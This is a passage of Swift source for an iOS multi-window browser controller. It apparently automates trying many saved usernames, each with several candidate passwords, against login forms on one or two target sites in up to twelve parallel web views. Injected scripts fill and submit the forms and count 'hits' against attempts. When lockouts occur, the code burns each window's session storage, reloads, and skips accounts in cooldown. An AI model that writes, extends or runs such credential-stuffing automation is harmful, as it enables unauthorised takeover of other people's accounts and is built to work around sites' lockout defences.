import Foundation
import SwiftData
import SwiftUI
import UIKit
import WebKit

/// Owns up to twelve `QuadSession` objects and orchestrates multi-window
/// browsing across whichever grid size is currently active (4, 6, 8, 9, or
/// 12 windows). Sessions beyond `activeCount` sit dormant — no WKWebView is
/// created for them until their cell is actually rendered.
@Observable
@MainActor
final class QuadController {
    /// All possible sessions, pre-allocated up to the largest grid (12).
    let sessions: [QuadSession]
    var focusedIndex: Int = 0
    /// The grid size currently in use. Call `setGridSize(_:)` so dual-site
    /// target assignments are recalculated whenever the window count changes.
    private(set) var gridSize: WindowGridSize = .four
    var activeCount: Int { gridSize.rawValue }
    /// The sessions actually shown/used by the current grid size.
    var activeSessions: [QuadSession] { Array(sessions.prefix(activeCount)) }
    /// Active sessions that are not disabled (e.g. 3×3 center in dual-site).
    var enabledSessions: [QuadSession] { activeSessions.filter { !$0.isDisabled } }

    var anyRCRRunning: Bool {
        enabledSessions.contains { $0.rcrRunning }
    }
    var lastCompletedAt: Date?
    /// When `true`, sessions retry passwords that previously came back as
    /// `failed`. `success` and `disabled` results are always skipped.
    var retryFailed: Bool = false
    /// Per-lane completed-credential counters for dual-site mode, sized to
    /// the active lane count whenever a dual-site run starts. Powers the
    /// compact summary bar shown on the larger grids.
    private(set) var laneCompletedCounts: [Int] = []

    private weak var browserViewModel: BrowserViewModel?
    /// Read-only access for multi-window UI (address bar sync, etc.).
    var hostBrowser: BrowserViewModel? { browserViewModel }
    private var modelContext: ModelContext?

    /// Per-session browser targets. Index maps to `session.index`.
    private var sessionTargetURLs: [URL?] = Array(repeating: nil, count: 12)
    private var dualSiteURLA: URL?
    private var dualSiteURLB: URL?
    private(set) var dualSiteSplitPattern: DualSiteSplitPattern = .checkerboard
    private(set) var isDualTargetMode: Bool = false

    init() {
        self.sessions = (0..<12).map { QuadSession(index: $0) }
    }

    func setup(modelContext: ModelContext, browser: BrowserViewModel) {
        self.modelContext = modelContext
        self.browserViewModel = browser
        for s in sessions where s.url == nil {
            s.url = BrowserViewModel.defaultHomeURL
        }
    }

    var focusedSession: QuadSession { sessions[focusedIndex] }

    /// Changes the active grid and immediately recalculates any current
    /// dual-site assignment for the new row/column geometry.
    func setGridSize(_ newSize: WindowGridSize) {
        guard newSize != gridSize else { return }
        gridSize = newSize
        if focusedIndex >= activeCount { focusedIndex = 0 }

        // Clear any disabled state from a previous dual-site 3×3 layout.
        for s in activeSessions { s.isDisabled = false }

        if isDualTargetMode,
           newSize.supportsDualSite,
           let urlA = dualSiteURLA,
           let urlB = dualSiteURLB {
            applyDualSiteTargets(urlA: urlA, urlB: urlB, pattern: dualSiteSplitPattern)
        } else if !newSize.supportsDualSite {
            isDualTargetMode = false
            for session in activeSessions { session.targetSiteIndex = 0 }
        }
    }

    /// Read-only access to a dual-site lane's two sessions (URL A side, URL
    /// B side). Valid for `lane` in `0..<laneCount`.
    func lanePair(_ lane: Int) -> (QuadSession, QuadSession) {
        (sessionA(forLane: lane), sessionB(forLane: lane))
    }

    func navigateFocused(to url: URL) {
        let s = focusedSession
        s.url = url
        s.webView?.load(URLRequest(url: url))
    }

    func navigateAll(to url: URL) {
        isDualTargetMode = false
        dualSiteURLA = url
        dualSiteURLB = nil
        for s in activeSessions {
            s.targetSiteIndex = 0
            s.isDisabled = false
            navigate(s, to: url)
        }
    }

    /// Navigates every currently assigned Site A or Site B browser tile.
    func navigateTargetSite(to url: URL, targetSiteIndex: Int) {
        guard targetSiteIndex == 0 || targetSiteIndex == 1 else { return }
        if targetSiteIndex == 0 { dualSiteURLA = url } else { dualSiteURLB = url }
        for session in activeSessions where session.targetSiteIndex == targetSiteIndex && !session.isDisabled {
            navigate(session, to: url)
        }
    }

    /// Recalculates an exactly even A/B assignment for the active grid, then
    /// navigates only tiles whose target changed. The 3×3 layout marks its
    /// center window as disabled and splits the remaining 8 evenly.
    func applyDualSiteTargets(urlA: URL, urlB: URL, pattern: DualSiteSplitPattern) {
        guard gridSize.supportsDualSite else {
            navigateAll(to: urlA)
            return
        }

        isDualTargetMode = true
        dualSiteURLA = urlA
        dualSiteURLB = urlB
        dualSiteSplitPattern = pattern

        for session in activeSessions {
            let target = pattern.targetSiteIndex(for: session.index, in: gridSize)
            if target == -1 {
                // 3×3 center window — disabled in dual-site mode.
                session.isDisabled = true
                session.targetSiteIndex = 0
                session.webView?.stopLoading()
                continue
            }
            session.isDisabled = false
            session.targetSiteIndex = target
            navigate(session, to: target == 0 ? urlA : urlB)
        }
        rebuildLaneMapping()
    }

    func representativeSession(forTargetSite targetSiteIndex: Int) -> QuadSession? {
        activeSessions.first { $0.targetSiteIndex == targetSiteIndex && !$0.isDisabled }
    }

    private func navigate(_ session: QuadSession, to url: URL) {
        session.url = url
        sessionTargetURLs[session.index] = url
        guard session.webView?.url != url else { return }
        session.webView?.load(URLRequest(url: url))
    }

    // MARK: - Queue snapshot for the per-session pill

    func queueSnapshot(for s: QuadSession, upcomingLimit: Int = 8) -> [RCRQueueItem] {
        guard !s.rcrQueueIDs.isEmpty else { return [] }
        var items: [RCRQueueItem] = []
        let total = s.rcrQueueIDs.count
        let upper = min(s.rcrIndex + upcomingLimit + 1, total)
        for i in s.rcrIndex..<upper {
            let id = s.rcrQueueIDs[i]
            let username = i < s.rcrQueueUsernames.count ? s.rcrQueueUsernames[i] : ""
            let pwCount = i < s.rcrQueuePasswordCounts.count ? s.rcrQueuePasswordCounts[i] : 0
            items.append(RCRQueueItem(
                id: id,
                username: username,
                passwordCount: pwCount,
                isCompleted: false,
                isCurrent: i == s.rcrIndex
            ))
        }
        return items
    }

    func completedSnapshot(for s: QuadSession) -> [RCRQueueItem] {
        guard !s.rcrQueueIDs.isEmpty else { return [] }
        var items: [RCRQueueItem] = []
        for (i, id) in s.rcrQueueIDs.enumerated() where s.rcrCompletedIDs.contains(id) {
            let username = i < s.rcrQueueUsernames.count ? s.rcrQueueUsernames[i] : ""
            let pwCount = i < s.rcrQueuePasswordCounts.count ? s.rcrQueuePasswordCounts[i] : 0
            items.append(RCRQueueItem(
                id: id,
                username: username,
                passwordCount: pwCount,
                isCompleted: true,
                isCurrent: false
            ))
        }
        return items
    }

    // MARK: - Quad RCR (normal 4-way split — unchanged)

    func startQuadRCR(targetURL: URL) {
        guard let context = modelContext else { return }
        dualQuadActive = false
        let descriptor = FetchDescriptor<Credential>(
            sortBy: [
                SortDescriptor(\Credential.domain),
                SortDescriptor(\Credential.username)
            ]
        )
        guard let all = try? context.fetch(descriptor), !all.isEmpty else {
            browserViewModel?.showToast("Vault is empty")
            return
        }
        let excluded = browserViewModel?.excludedDomainSet ?? []
        let queue = all.filter { !excluded.contains(ExcludedDomain.canonicalize($0.domain)) }
        guard !queue.isEmpty else {
            browserViewModel?.showToast("Vault is empty")
            return
        }
        // Reset all active session targets to the shared URL and clear disabled.
        for s in activeSessions {
            s.isDisabled = false
            sessionTargetURLs[s.index] = targetURL
        }
        partitionAndStart(queue: queue, targetURL: targetURL)
    }

    /// Splits the vault evenly across every active window (4/6/8/9/12) using
    /// balanced round-robin so that every window gets either floor(N/W) or
    /// ceil(N/W) credentials — guaranteed equal to within one, no matter
    /// how small the vault. For repeatability across runs the queue is
    /// sorted the same way every time (domain → username). Disabled windows
    /// (e.g. 3×3 center in dual-site mode) are excluded from the partition.
    private func partitionAndStart(queue: [Credential], targetURL: URL) {
        guard let context = modelContext else { return }

        let participants = enabledSessions
        let count = participants.count
        guard count > 0 else {
            browserViewModel?.showToast("No active windows")
            return
        }
        var slices: [[Credential]] = Array(repeating: [], count: count)
        for (i, c) in queue.enumerated() {
            slices[i % count].append(c)
        }

        let domain = targetURL.host(percentEncoded: false)?.lowercased() ?? ""
        let tracker = AttemptTrackingService.shared

        for (sliceIdx, s) in participants.enumerated() {
            let creds = slices[sliceIdx]
            if !creds.isEmpty {
                let allFinished = creds.allSatisfy { c in
                    let pwCount = KeychainService.shared.getPasswords(for: c.id).count
                    return tracker.credentialIsFinished(
                        context: context, credentialID: c.id, targetDomain: domain, totalPasswords: pwCount
                    )
                }
                if allFinished {
                    tracker.clearAttempts(context: context, credentialIDs: Set(creds.map(\.id)), targetDomain: domain)
                }
            }
            startSessionRCR(s, creds: creds, targetURL: targetURL, targetDomain: domain, context: context, tracker: tracker)
        }
    }

    private func startSessionRCR(
        _ s: QuadSession,
        creds: [Credential],
        targetURL: URL,
        targetDomain: String,
        context: ModelContext,
        tracker: AttemptTrackingService
    ) {
        let credIDs = creds.map(\.id)
        let usernames = creds.map(\.username)
        let counts: [Int] = credIDs.map { id in KeychainService.shared.getPasswords(for: id).count }

        s.rcrQueueIDs = credIDs
        s.rcrQueueUsernames = usernames
        s.rcrQueuePasswordCounts = counts
        s.rcrTotal = credIDs.count
        s.rcrIndex = 0
        s.rcrPasswordIndex = 0
        s.rcrSuccessCount = 0
        s.rcrCompletedIDs = []
        s.rcrTargetURL = targetURL
        s.rcrCurrentDomain = targetDomain
        s.rcrAwaitingNavigation = false

        sessionTargetURLs[s.index] = targetURL

        while s.rcrIndex < s.rcrTotal {
            let id = s.rcrQueueIDs[s.rcrIndex]
            let total = s.rcrQueuePasswordCounts[s.rcrIndex]
            let finished = tracker.credentialIsFinished(
                context: context,
                credentialID: id,
                targetDomain: targetDomain,
                totalPasswords: total
            )
            if finished || PermaDisabledStore.shared.isDisabled(credentialID: id) {
                s.rcrCompletedIDs.insert(id)
                s.rcrIndex += 1
            } else {
                break
            }
        }

        if s.rcrTotal > 0 && s.rcrIndex < s.rcrTotal {
            s.rcrRunning = true
            s.rcrStatus = .navigating
            Task { await self.runCurrent(session: s) }
        } else {
            s.rcrRunning = false
            s.rcrStatus = .finished
        }
    }

    func stopQuadRCR(reason: String? = nil) {
        for s in enabledSessions where s.rcrRunning {
            s.rcrRunning = false
            s.rcrStatus = .idle
            s.rcrAwaitingNavigation = false
            s.rcrExtraSubmitsInFlight = false
            s.webView?.evaluateJavaScript(
                JavaScriptInjectionService.rcrUninstallObserverScript(),
                completionHandler: nil
            )
        }
        dualQuadActive = false
        laneStates = []
        laneCompletedCounts = Array(repeating: 0, count: laneCount)
        dualNeedsBurn = [:]
        if let reason { browserViewModel?.showToast(reason) }
    }

    private func currentCredential(_ session: QuadSession) -> Credential? {
        guard session.rcrIndex < session.rcrQueueIDs.count, let context = modelContext else { return nil }
        let id = session.rcrQueueIDs[session.rcrIndex]
        let descriptor = FetchDescriptor<Credential>(predicate: #Predicate<Credential> { $0.id == id })
        return try? context.fetch(descriptor).first
    }

    private func runCurrent(session s: QuadSession) async {
        guard s.rcrRunning else { return }
        // Skip credentials in temp-disabled cooldown OR ever perma-disabled.
        while s.rcrIndex < s.rcrQueueIDs.count {
            let id = s.rcrQueueIDs[s.rcrIndex]
            if TempDisabledStore.shared.isDisabled(credentialID: id)
                || PermaDisabledStore.shared.isDisabled(credentialID: id) {
                s.rcrCompletedIDs.insert(id)
                s.rcrIndex += 1
                s.rcrPasswordIndex = 0
            } else {
                break
            }
        }
        guard s.rcrIndex < s.rcrQueueIDs.count else {
            s.rcrRunning = false
            s.rcrStatus = .finished
            checkAllFinished()
            return
        }

        guard let credential = currentCredential(s) else {
            s.rcrIndex += 1
            await runCurrent(session: s)
            return
        }

        let credID = credential.id
        let allPasswords = await Task.detached {
            KeychainService.shared.getPasswords(for: credID)
        }.value

        guard !allPasswords.isEmpty else {
            s.rcrCompletedIDs.insert(credential.id)
            s.rcrIndex += 1
            s.rcrPasswordIndex = 0
            await runCurrent(session: s)
            return
        }

        // Resume-safe filtering.
        let targetDomain = s.rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? ""
        let filtered: [String]
        if let context = modelContext {
            if retryFailed {
                let tracker = AttemptTrackingService.shared
                filtered = allPasswords.filter { pw in
                    !tracker.isTerminallyAttempted(
                        context: context,
                        credentialID: credID,
                        passwordHash: PasswordFingerprint.hash(pw),
                        targetDomain: targetDomain
                    )
                }
            } else {
                let descriptor = FetchDescriptor<AttemptRecord>(
                    predicate: #Predicate<AttemptRecord> { rec in
                        rec.credentialID == credID
                            && rec.targetDomain == targetDomain
                            && rec.statusRaw != "pending"
                            && rec.statusRaw != "skipped"
                    }
                )
                let attempted = Set(((try? context.fetch(descriptor)) ?? []).map { $0.passwordHash })
                filtered = allPasswords.filter { !attempted.contains(PasswordFingerprint.hash($0)) }
            }
        } else {
            filtered = allPasswords
        }

        guard !filtered.isEmpty else {
            s.rcrCompletedIDs.insert(credential.id)
            s.rcrIndex += 1
            s.rcrPasswordIndex = 0
            await runCurrent(session: s)
            return
        }

        s.rcrPasswords = filtered
        s.rcrPasswordIndex = 0
        s.rcrCurrentUsername = credential.username
        if let target = s.rcrTargetURL {
            s.rcrCurrentDomain = target.host(percentEncoded: false) ?? credential.domain
        }

        let liveURL = s.webView?.url ?? s.url
        if !sameTarget(liveURL, s.rcrTargetURL), let target = s.rcrTargetURL {
            s.rcrStatus = .navigating
            s.rcrAwaitingNavigation = true
            s.url = target
            s.webView?.load(URLRequest(url: target))
            return
        }

        await attemptFill(session: s)
    }

    private func sameTarget(_ a: URL?, _ b: URL?) -> Bool {
        guard let a, let b else { return false }
        return a.scheme?.lowercased() == b.scheme?.lowercased()
            && a.host(percentEncoded: false)?.lowercased() == b.host(percentEncoded: false)?.lowercased()
            && a.path == b.path
    }

    private func attemptFill(session s: QuadSession) async {
        guard s.rcrRunning, !s.rcrPasswords.isEmpty else { return }
        guard let credential = currentCredential(s) else {
            s.rcrIndex += 1
            await runCurrent(session: s)
            return
        }
        let password = s.rcrPasswords[s.rcrPasswordIndex]
        let targetDomain = s.rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? credential.domain
        let siteSetting = browserViewModel?.fetchSiteSetting(for: targetDomain)

        s.rcrStatus = .filling
        let fillScript = JavaScriptInjectionService.fillCredentialScript(
            username: credential.username,
            password: password,
            usernameSelector: siteSetting?.usernameSelector,
            passwordSelector: siteSetting?.passwordSelector,
            suppressKeyboard: true
        )
        _ = try? await s.webView?.evaluateJavaScript(fillScript)

        s.rcrStatus = .submitting
        let submitScript = JavaScriptInjectionService.submitFormScript(
            submitSelector: siteSetting?.submitButtonSelector
        )
        _ = try? await s.webView?.evaluateJavaScript(submitScript)

        // Optional extra submits (sure-login). Paused while in-flight. The
        // page is checked after every extra submit — a permanent disable,
        // temp-disable, or success stops further submits immediately.
        let extraCount = max(0, UserDefaults.standard.integer(forKey: "rcrExtraSubmits"))
        let rawDelay = UserDefaults.standard.double(forKey: "rcrSubmitDelay")
        let delay = rawDelay > 0 ? rawDelay : 1.5
        if extraCount > 0 {
            s.rcrExtraSubmitsInFlight = true
            for _ in 0..<extraCount {
                try? await Task.sleep(for: .seconds(delay))
                guard s.rcrRunning else { s.rcrExtraSubmitsInFlight = false; return }
                _ = try? await s.webView?.evaluateJavaScript(submitScript)

                try? await Task.sleep(for: .seconds(0.35))
                guard s.rcrRunning else { s.rcrExtraSubmitsInFlight = false; return }
                let rawState = try? await s.webView?.evaluateJavaScript(
                    JavaScriptInjectionService.pageStateSnapshotScript()
                )
                if let payload = JavaScriptInjectionService.parsePageState(rawState),
                   JavaScriptInjectionService.isTerminalRCRState(payload) {
                    s.rcrExtraSubmitsInFlight = false
                    s.rcrStatus = .waiting
                    handleRCRMessage(session: s, payload: payload)
                    return
                }
            }
            s.rcrExtraSubmitsInFlight = false
        }

        credential.lastUsedAt = Date()
        credential.usageCount += 1
        try? modelContext?.save()

        // Pre-record pending.
        if let context = modelContext {
            _ = AttemptTrackingService.shared.recordAttempt(
                context: context,
                credentialID: credential.id,
                username: credential.username,
                password: password,
                passwordIndex: s.rcrPasswordIndex + 1,
                passwordTotal: s.rcrPasswords.count,
                targetDomain: targetDomain,
                sessionTag: s.sessionTag,
                status: .pending
            )
        }

        s.rcrStatus = .waiting
        let installScript = JavaScriptInjectionService.rcrInstallObserverScript()
        _ = try? await s.webView?.evaluateJavaScript(installScript)
    }

    /// Entry point for the WKScriptMessageHandler — routes to the normal
    /// 4-way handler or the dual-quad paired-lane handler.
    func handleRCRMessage(session s: QuadSession, payload: [String: Any]) {
        if dualQuadActive {
            handleDualQuadMessage(session: s, payload: payload)
            return
        }
        guard s.rcrRunning, s.rcrStatus == .waiting else { return }
        if s.rcrExtraSubmitsInFlight { return }
        let hasPassword = payload["hasPassword"] as? Bool ?? false
        let hasWelcome = payload["hasWelcome"] as? Bool ?? false
        let hasDisabled = payload["hasDisabled"] as? Bool ?? false
        let hasTempDisabled = payload["hasTempDisabled"] as? Bool ?? false
        let hasSuccess = payload["hasSuccess"] as? Bool ?? false
        let isHomepage = payload["isHomepage"] as? Bool ?? false

        guard let credential = currentCredential(s) else {
            s.rcrIndex += 1
            Task { await self.runCurrent(session: s) }
            return
        }

        let password = s.rcrPasswords[safe: s.rcrPasswordIndex] ?? ""

        if hasWelcome || hasSuccess || (isHomepage && !hasPassword) {
            s.rcrSuccessCount += 1
            s.rcrStatus = .success
            s.rcrCompletedIDs.insert(credential.id)
            captureAndRecord(session: s, credential: credential, password: password, status: .success)
            s.rcrIndex += 1
            s.rcrPasswordIndex = 0
            Task { await self.runCurrent(session: s) }
            return
        }

        if hasDisabled {
            PermaDisabledStore.shared.markDisabled(credentialID: credential.id)
            captureAndRecord(session: s, credential: credential, password: password, status: .disabled)
            deleteCredentialPermanently(credential)
            Task { await self.burnAndAdvance(session: s, completedID: credential.id) }
            return
        }

        if hasTempDisabled {
            captureAndRecord(session: s, credential: credential, password: password, status: .tempDisabled)
            let hasMore = s.rcrPasswords.count > 1
            if hasMore {
                TempDisabledStore.shared.markDisabled(credentialID: credential.id)
                browserViewModel?.showToast("Temp-disabled — \(credential.username)")
                s.rcrCompletedIDs.insert(credential.id)
                s.rcrIndex += 1
                s.rcrPasswordIndex = 0
                Task { await self.runCurrent(session: s) }
            } else {
                if s.rcrPasswordIndex + 1 < s.rcrPasswords.count {
                    s.rcrPasswordIndex += 1
                    Task { await self.attemptFill(session: s) }
                } else {
                    s.rcrCompletedIDs.insert(credential.id)
                    s.rcrIndex += 1
                    s.rcrPasswordIndex = 0
                    Task { await self.runCurrent(session: s) }
                }
            }
            return
        }

        if hasPassword {
            captureAndRecord(session: s, credential: credential, password: password, status: .failed)
            if s.rcrPasswordIndex + 1 < s.rcrPasswords.count {
                s.rcrPasswordIndex += 1
                Task { await self.attemptFill(session: s) }
            } else {
                s.rcrCompletedIDs.insert(credential.id)
                s.rcrIndex += 1
                s.rcrPasswordIndex = 0
                Task { await self.runCurrent(session: s) }
            }
        }
    }

    private func burnAndAdvance(session s: QuadSession, completedID: String) async {
        s.rcrStatus = .burning
        s.rcrBurnFlash &+= 1
        await QuadDataStore.burn(index: s.index)
        s.rcrCompletedIDs.insert(completedID)
        s.rcrIndex += 1
        s.rcrPasswordIndex = 0
        if let target = s.rcrTargetURL {
            s.rcrStatus = .navigating
            s.rcrAwaitingNavigation = true
            s.url = target
            s.webView?.load(URLRequest(url: target))
            return
        }
        await runCurrent(session: s)
    }

    func cellPageDidFinish(session s: QuadSession) {
        guard s.rcrRunning else { return }
        if s.rcrAwaitingNavigation {
            s.rcrAwaitingNavigation = false
            // Cookie popups only ever appear on a window's first load or
            // right after a burn+reload — both land here. Wait for it to
            // appear-and-dismiss (or time out) before filling the next login.
            Task {
                await self.waitForCookieNoticeIfNeeded(session: s)
                if self.dualQuadActive {
                    await self.attemptFillDual(session: s, lane: self.laneIndex(for: s))
                } else {
                    await self.attemptFill(session: s)
                }
            }
            return
        }
        if s.rcrExtraSubmitsInFlight { return }
        if s.rcrStatus == .waiting || s.rcrStatus == .submitting {
            s.webView?.evaluateJavaScript(
                JavaScriptInjectionService.rcrInstallObserverScript(),
                completionHandler: nil
            )
        }
    }

    /// Deletes a permanently-disabled credential's keychain password and its
    /// SwiftData row so it can never be selected again by any future run in
    /// any window. History of the attempt lives on in `AttemptRecord`.
    private func deleteCredentialPermanently(_ credential: Credential) {
        KeychainService.shared.deletePassword(for: credential.id)
        if let context = modelContext {
            context.delete(credential)
            try? context.save()
        }
    }

    /// Waits (up to ~10s) for a cookie/consent banner to appear and be
    /// dismissed. No-op if no banner is present when called.
    private func waitForCookieNoticeIfNeeded(session s: QuadSession) async {
        guard let webView = s.webView else { return }
        _ = try? await webView.evaluateJavaScript(JavaScriptInjectionService.waitForCookieNoticeScript())
    }

    private func checkAllFinished() {
        let allDone = enabledSessions.allSatisfy { !$0.rcrRunning }
        guard allDone else { return }
        let totalSuccess = enabledSessions.reduce(0) { $0 + $1.rcrSuccessCount }
        let totalTried = enabledSessions.reduce(0) { $0 + $1.rcrTotal }
        lastCompletedAt = Date()
        browserViewModel?.showToast("Quad RCR complete — \(totalSuccess) hits / \(totalTried) tried")
    }

    private func captureAndRecord(
        session s: QuadSession,
        credential: Credential,
        password: String,
        status: AttemptRecord.Status
    ) {
        guard let context = modelContext else { return }
        let webView = s.webView
        let pageURL = webView?.url?.absoluteString
        let pageTitle = webView?.title
        let targetDomain = s.rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? credential.domain
        let pwIndex = s.rcrPasswordIndex + 1
        let pwTotal = s.rcrPasswords.count
        let credID = credential.id
        let username = credential.username
        let tag = s.sessionTag

        if let webView {
            let config = WKSnapshotConfiguration()
            config.snapshotWidth = 600
            webView.takeSnapshot(with: config) { image, _ in
                guard let image else {
                    Task { @MainActor in
                        _ = AttemptTrackingService.shared.recordAttempt(
                            context: context,
                            credentialID: credID,
                            username: username,
                            password: password,
                            passwordIndex: pwIndex,
                            passwordTotal: pwTotal,
                            targetDomain: targetDomain,
                            sessionTag: tag,
                            status: status,
                            resultURL: pageURL,
                            resultPageTitle: pageTitle,
                            screenshotFilename: nil
                        )
                    }
                    return
                }
                let filename = ScreenshotStorage.save(image)
                Task { @MainActor in
                    let record = AttemptTrackingService.shared.recordAttempt(
                        context: context,
                        credentialID: credID,
                        username: username,
                        password: password,
                        passwordIndex: pwIndex,
                        passwordTotal: pwTotal,
                        targetDomain: targetDomain,
                        sessionTag: tag,
                        status: status,
                        resultURL: pageURL,
                        resultPageTitle: pageTitle,
                        screenshotFilename: filename
                    )
                    Task.detached {
                        let result = await ScreenshotOCRService.classify(image)
                        await MainActor.run {
                            record.ocrCategory = result.category.rawValue
                            try? context.save()
                        }
                    }
                }
            }
        } else {
            _ = AttemptTrackingService.shared.recordAttempt(
                context: context,
                credentialID: credID,
                username: username,
                password: password,
                passwordIndex: pwIndex,
                passwordTotal: pwTotal,
                targetDomain: targetDomain,
                sessionTag: tag,
                status: status,
                resultURL: pageURL,
                resultPageTitle: pageTitle,
                screenshotFilename: nil
            )
        }
    }

    // MARK: - Dual-quad RCR (paired-lane model)
    //
    // Dual URL split mode tests two vault entries at a time per pair — not
    // independent per-window slices. Active sessions are grouped into lanes
    // determined by the active split pattern (horizontal, vertical, or
    // checkerboard). Each lane pairs one Site A session with one Site B
    // session so that both sides test the SAME credential concurrently —
    // one against URL A, the other against URL B. The lane only advances
    // once BOTH sides reach a terminal result.
    //
    // Credentials are pre-balanced across lanes using round-robin so every
    // lane gets either floor(N/lanes) or ceil(N/lanes) — equal to within
    // one credential, no matter the vault size. This replaces the old
    // greedy shared-pool model that could starve slow lanes.

    private struct LaneState {
        var credentials: [Credential] = []
        var index: Int = 0
        var resultA: AttemptRecord.Status?
        var resultB: AttemptRecord.Status?
        var finalizing: Bool = false
    }

    private var dualQuadActive: Bool = false
    private var dualQuadURLA: URL?
    private var dualQuadURLB: URL?
    private var dualQuadTargetDomainA: String = ""
    private var dualQuadTargetDomainB: String = ""
    private var laneStates: [LaneState] = []
    /// Dynamic lane→session mapping, rebuilt from the active split pattern
    /// so that horizontal, vertical, and checkerboard distributions each
    /// pair the correct A-side and B-side sessions together.
    private var laneSessionAIndices: [Int] = []
    private var laneSessionBIndices: [Int] = []
    /// True when a session's side hit a permanent "been disabled" and needs
    /// its isolated data store burned + the login page reloaded (with a
    /// cookie-notice wait) before the lane's next credential is attempted.
    private var dualNeedsBurn: [Int: Bool] = [:]
    private var dualCredentialIDBySessionIndex: [Int: String] = [:]

    /// Number of A/B lane pairs available for dual-site RCR.
    var laneCount: Int { laneSessionAIndices.count }

    /// Rebuilds lane pairings from the current `targetSiteIndex` assignments.
    /// Each lane pairs one Site A session with one Site B session, in index
    /// order, so the pairing always matches the visual split pattern.
    /// Disabled sessions (e.g. 3×3 center) are excluded entirely.
    private func rebuildLaneMapping() {
        let activeIndices = Array(0..<activeCount).filter { !sessions[$0].isDisabled }
        let aIndices = activeIndices.filter { sessions[$0].targetSiteIndex == 0 }
        let bIndices = activeIndices.filter { sessions[$0].targetSiteIndex == 1 }
        let count = min(aIndices.count, bIndices.count)
        laneSessionAIndices = Array(aIndices.prefix(count))
        laneSessionBIndices = Array(bIndices.prefix(count))
    }

    private func laneIndex(for session: QuadSession) -> Int {
        for i in 0..<laneSessionAIndices.count {
            if laneSessionAIndices[i] == session.index || laneSessionBIndices[i] == session.index {
                return i
            }
        }
        return 0
    }
    private func isASide(_ session: QuadSession) -> Bool {
        laneSessionAIndices.contains(session.index)
    }
    private func sessionA(forLane lane: Int) -> QuadSession {
        guard laneSessionAIndices.indices.contains(lane) else { return sessions[0] }
        return sessions[laneSessionAIndices[lane]]
    }
    private func sessionB(forLane lane: Int) -> QuadSession {
        guard laneSessionBIndices.indices.contains(lane) else { return sessions[1] }
        return sessions[laneSessionBIndices[lane]]
    }

    private func currentDualCredential(_ s: QuadSession) -> Credential? {
        guard let id = dualCredentialIDBySessionIndex[s.index], let context = modelContext else { return nil }
        let descriptor = FetchDescriptor<Credential>(predicate: #Predicate<Credential> { $0.id == id })
        return try? context.fetch(descriptor).first
    }

    /// Dual-quad RCR: two lanes, each testing one credential against BOTH
    /// URL A and URL B before advancing to the next vault entry.
    func startDualQuadRCR(urlA: URL, urlB: URL) {
        guard let context = modelContext else { return }
        let descriptor = FetchDescriptor<Credential>(
            sortBy: [
                SortDescriptor(\Credential.domain),
                SortDescriptor(\Credential.username)
            ]
        )
        guard let all = try? context.fetch(descriptor), !all.isEmpty else {
            browserViewModel?.showToast("Vault is empty")
            return
        }
        let excluded = browserViewModel?.excludedDomainSet ?? []
        let domainA = urlA.host(percentEncoded: false)?.lowercased() ?? ""
        let domainB = urlB.host(percentEncoded: false)?.lowercased() ?? ""
        let tracker = AttemptTrackingService.shared

        func eligiblePool() -> [Credential] {
            all.filter { cred in
                !excluded.contains(ExcludedDomain.canonicalize(cred.domain))
                    && !PermaDisabledStore.shared.isDisabled(credentialID: cred.id)
            }
        }

        var pool = eligiblePool().filter { cred in
            let pwCount = KeychainService.shared.getPasswords(for: cred.id).count
            let doneA = tracker.credentialIsFinished(
                context: context, credentialID: cred.id, targetDomain: domainA, totalPasswords: pwCount
            )
            let doneB = tracker.credentialIsFinished(
                context: context, credentialID: cred.id, targetDomain: domainB, totalPasswords: pwCount
            )
            return !(doneA && doneB)
        }

        if pool.isEmpty {
            // The whole vault already finished against both URLs — restart clean.
            tracker.clearAttempts(context: context, targetDomain: domainA)
            tracker.clearAttempts(context: context, targetDomain: domainB)
            pool = eligiblePool()
        }

        guard !pool.isEmpty else {
            browserViewModel?.showToast("Vault is empty")
            return
        }

        let lanes = laneSessionAIndices.count
        guard lanes > 0 else {
            browserViewModel?.showToast("No valid lane pairing for this layout")
            return
        }

        // Pre-balance: round-robin credentials across lanes so each lane
        // gets either floor(N/lanes) or ceil(N/lanes) — guaranteed equal
        // to within one credential, no matter the vault size or lane count.
        var laneSlices: [[Credential]] = Array(repeating: [], count: lanes)
        for (i, cred) in pool.enumerated() {
            laneSlices[i % lanes].append(cred)
        }

        dualQuadURLA = urlA
        dualQuadURLB = urlB
        dualQuadTargetDomainA = domainA
        dualQuadTargetDomainB = domainB
        dualQuadActive = true
        dualNeedsBurn = [:]
        dualCredentialIDBySessionIndex = [:]
        laneStates = (0..<lanes).map { LaneState(credentials: laneSlices[$0]) }
        laneCompletedCounts = Array(repeating: 0, count: lanes)

        for lane in 0..<lanes {
            let slice = laneSlices[lane]
            let sliceIDs = slice.map(\.id)
            let sliceUsernames = slice.map(\.username)
            let sliceCounts: [Int] = sliceIDs.map { KeychainService.shared.getPasswords(for: $0).count }
            for s in [sessionA(forLane: lane), sessionB(forLane: lane)] {
                s.rcrQueueIDs = sliceIDs
                s.rcrQueueUsernames = sliceUsernames
                s.rcrQueuePasswordCounts = sliceCounts
                s.rcrTotal = slice.count
                s.rcrCompletedIDs = []
                s.rcrIndex = 0
                s.rcrSuccessCount = 0
                s.rcrAwaitingNavigation = false
                s.rcrExtraSubmitsInFlight = false
            }
        }

        for lane in 0..<lanes {
            assignNextCredential(lane: lane)
        }
    }

    /// Pulls the next unclaimed credential from the shared pool for `lane`
    /// and kicks off both of its sessions "sortve parallel" against URL A
    /// and URL B. If the pool is exhausted, the lane is marked finished.
    private func assignNextCredential(lane: Int) {
        guard dualQuadActive else { return }
        let sA = sessionA(forLane: lane)
        let sB = sessionB(forLane: lane)

        guard laneStates[lane].index < laneStates[lane].credentials.count else {
            sA.rcrRunning = false
            sA.rcrStatus = .finished
            sB.rcrRunning = false
            sB.rcrStatus = .finished
            checkDualQuadAllFinished()
            return
        }

        let credential = laneStates[lane].credentials[laneStates[lane].index]
        laneStates[lane].resultA = nil
        laneStates[lane].resultB = nil
        laneStates[lane].finalizing = false
        dualCredentialIDBySessionIndex[sA.index] = credential.id
        dualCredentialIDBySessionIndex[sB.index] = credential.id

        for s in [sA, sB] {
            s.rcrIndex = laneStates[lane].index
            s.rcrCurrentUsername = credential.username
            s.rcrRunning = true
            s.rcrStatus = .navigating
        }

        guard let urlA = dualQuadURLA, let urlB = dualQuadURLB else { return }
        Task {
            await self.runDualSide(
                session: sA, credential: credential, targetURL: urlA,
